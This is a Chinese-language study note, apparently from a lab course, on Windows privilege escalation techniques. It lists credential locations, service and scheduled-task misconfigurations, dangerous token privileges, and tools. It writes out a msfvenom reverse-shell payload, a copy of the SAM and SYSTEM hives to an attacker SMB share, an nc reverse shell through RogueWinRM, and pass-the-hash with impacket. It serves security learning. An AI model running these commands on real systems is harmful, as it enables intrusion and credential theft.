- windows 权限提升
  - 常见利用漏洞
    1. Windows 服务或计划任务配置错误
    2. 分配给某个帐户的权限过多
    3. 易受攻击的软件
    4. 缺少 Windows 安全补丁
- 常见地点收集密码
  - 无人值守的 Windows 安装
    - 在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机
    - 此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：
      - C:\Unattend.xml
      - C:\Windows\Panther\Unattend.xml
      - C:\Windows\Panther\Unattend\Unattend.xml
      - C:\Windows\system32\sysprep.inf
      - C:\Windows\system32\sysprep\sysprep.xml
    - 常见的类型如下
      ```
      <Credentials>
        <Username>Administrator</Username>
        <Domain>thm.local</Domain>
        <Password>MyPassword123</Password>
      </Credentials>
      ```
  - PowerShell 历史
    - 在 cmd 中运行 `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
    - 或在 powershell 中运行 `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
      - Powershell 不把 `%userprofile%` 作为一个环境变量，应使用 `$Env:userprofile` 代替
  - 保存的 Windows 凭据
    - `cmdkey /list` 列出凭据

      ![cmdkey1](image/cmdkey1.jpg)

    - 如果发现了可以尝试的密码凭证，可以使用 `runas /savecred /user:admin cmd.exe` 尝试
  
      ![cmdkey3](image/cmdkey3.jpg)

    - IIS 配置
      - Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器
      - IIS 上网站的配置存储在名为 的文件中，`web.config` 并且可以存储数据库的密码或配置的身份验证机制
      - 根据安装的 IIS 版本，我们可以在以下位置之一找到 `web.config`
        - C:\inetpub\wwwroot\web.config
        - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
      - `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

        ![iis1](image/iis1.jpg)

    - Putty 配置文件
      - `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
        -  Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分）
  
        ![putty1](image/putty1.jpg)
    
- 其它方法
  - 计划任务
    - 使用 `schtasks` 列出计划任务

    ![schtask1](image/schtask1.jpg)

    - 使用 `schtasks /query /tn vulntask /fo list /v` 列出 vulntask 的参数
      - `Task to run` , 该参数指示计划任务执行的内容
      - `Run As User` , 该参数显示将使用的用户执行任务
  
        ![schtask2](image/schtask2.jpg)

    - 使用 `icacls` 查看权限, `F ` 代表完全访问权限
  
      ![schtask3](image/schtask3.jpg)
    - 修改文件，生成反向shell
  - 永久后门
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.219.15 LPORT=LOCAL_PORT -f msi -o malicious.msi`
- 滥用服务的错误配置
  - Windows Services
    - Windows Services是由服务控制管理器(SCM)管理, SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程
    - 使用 `sc qc` 命令检查服务配置
      - 关联的可执行文件是通过**BINARY_PATH_NAME**参数指定
      - 用于运行服务的帐户显示在**SERVICE_START_NAME**参数上
  - 关联的可执行文件的不安全权限
    - `sc qc` 查看服务配置, 检查**BINARY_PATH_NAME**参数指定的可执行文件
    - `icacls` 查看可执行文件的权限
    - 若具有修改权限或者完全访问权限，则使用 payload 替换该可执行文件
    - 等待服务重启
    - 获得**SERVICE_START_NAME**参数标注用户的反向shell
  - 未加引号的服务路径
    - **BINARY_PATH_NAME**参数指定关联的可执行文件路径含有空格且未正确使用 `""` 引号
      ```
      例如
      BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
      当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个：
        C:\MyPrograms\Disk.exe (Sorter Enterprise\bin\disksrs.exe)
        C:\MyPrograms\Disk Sorter.exe (Enterprise\bin\disksrs.exe)
        C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
      ```
    - 则使用 payload 伪造路径上的可执行文件
  - 不安全的服务权限
    - 如果拥有修改服务本身的权限，可替换**SERVICE_START_NAME**参数为payload的路径
- 滥用的危险特权
  - 使用 `whoami /priv` 查询特权
    - `gpedit.msc` 组策略管理器
    - Disabled privileges are as good as enabled ones.(禁用和启用一样有用)
  - [可利用特权的完整列表](https://github.com/gtworek/Priv2Admin)
  - SeBackup 特权
    - SeBackup 特权使系统向任何文件授予所有读取访问控制权，而无需完全管理权限
    - 这种特权允许攻击者使用多种技术轻松提升系统权限。例如，复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值
    - 流程
      1. 备份 SAM 和 SYSTEM 
        - 使用 `reg save hklm\system system.hive` 和 `reg save hklm\sam sam.hive`
      2. 使用任何方法把备份复制到攻击者本地, 举例使用 SMB 共享
        - 利用 impacket 工具包
          - `mkdir share`
          - `impacket-smbserver -smb2support -username USERNAME -password PASSWORD public share`
          - `copy sam.hive \\ATTACKER_IP\public\`
          - `copy system.hive \\ATTACKER_IP\public\`
      3. 利用 impacket 工具包检索用户密码 hash 值
        - `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
      4. 使用管理员的哈希来执行哈希传递攻击
        - `impacket-psexec -hashes HASH1:HASH2 administrator@MACHINE_IP`
  - SeRestore 特权
    - SeRestore 特权使系统向任何文件授予所有写取访问控制权，而无需完全管理权限
      1. Launch PowerShell/ISE with the SeRestore privilege present.
      2. Enable the privilege with Enable-SeRestorePrivilege.
      3. Rename utilman.exe to utilman.old
        - 重命名 `Rename-Item -Path "c:\logfiles\daily_file.txt" -NewName "monday_file.txt"`
      4. Rename cmd.exe to utilman.exe
      5. Lock the console and press Win+U
  - SeTakeOwnership 特权
    - SeTakeOwnership 特权允许用户获取系统上任何对象的所有权
      1. `takeown /f "%windir%\system32"`
      2. `icacls "%windir%\system32" /grant "%username%":F`
      3. Rename cmd.exe to utilman.exe
        - `copy cmd.exe utilman.exe`
      4. Lock the console and press Win+U
  - SeImpersonate / SeAssignPrimaryToken 特权
    - SeImpersonate / SeAssignPrimaryToken 特权允许进程模拟其他用户并代表他们执行操作
      1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟
      2. 找到一种方法来强制特权用户连接并验证生成的恶意进程
    - 使用 RogueWinRM 漏洞来实现这两个条件
      - `c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
      - `-p` 指定漏洞利用程序要运行的可执行文件
      - `-a` 用于将参数传递给可执行文件，传递的参数是`-e cmd.exe ATTACKER_IP 4442`
- 滥用的软件漏洞
  - 未打补丁的软件 `wmic product get name,version,vendor`
    - `wmic product` 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的
    - 一旦我们收集了产品版本信息，我们就可以随时在exploit-db、  packetstorm 或plain old  Google等网站上在线搜索已安装软件的现有漏洞
  - 案例研究：Druva inSync 6.6.3
    - 目标服务器正在运行 Druva inSync 6.6.3，该服务器容易受到权限升级的影响
    - 该漏洞是由于对Chris Lyne最初报告的 6.5.0 版本的另一个漏洞应用了错误补丁而导致的
    - 该软件容易受到攻击，因为它以系统权限在端口 6064 上运行 RPC（远程过程调用）服务器，只能从本地主机访问
    - RPC是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们
    - [原始漏洞利用代码](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html)
- 自动化工具
  - [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)是一个开发用于枚举目标系统以发现权限提升路径的脚本
  - [PrivescCheck](https://github.com/itm4n/PrivescCheck) 是一个PowerShell脚本
  - [WES-NG](https://github.com/bitsadmin/wesng)
    - 运行在攻击端，防止病毒查杀
    - 使用 `wes.py --update` 升级脚本
    - `systeminfo` 收集目标终端信息
    - `wes.py systeminfo.txt`
  - Metasploit
    - 如果已经拥有 Meterpreter shell，使用 `multi/recon/local_exploit_suggester` 模块
